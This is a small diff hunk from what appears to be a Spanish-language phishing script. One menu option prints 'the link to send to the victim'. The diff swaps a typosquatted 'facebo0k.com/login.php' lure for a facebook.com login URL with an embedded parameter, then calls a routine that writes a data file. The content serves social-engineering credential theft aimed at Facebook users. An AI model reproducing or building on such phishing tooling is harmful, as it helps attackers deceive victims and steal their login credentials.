@@ -60,7 +60,7 @@ elif [[ $opcion == "03" || $opcion == "3" ]]; then
   echo -e "El link para enviar a la victima es: "
   sleep 5s
   echo -e ""
-  echo -e "https://facebo0k.com/login.php"
+  echo -e "https://www.facebook.com/login/web/?email=7711611701&is_from_lara=1"
   echo -e ""
   hacer_archivo_con_datos
   sleep 2
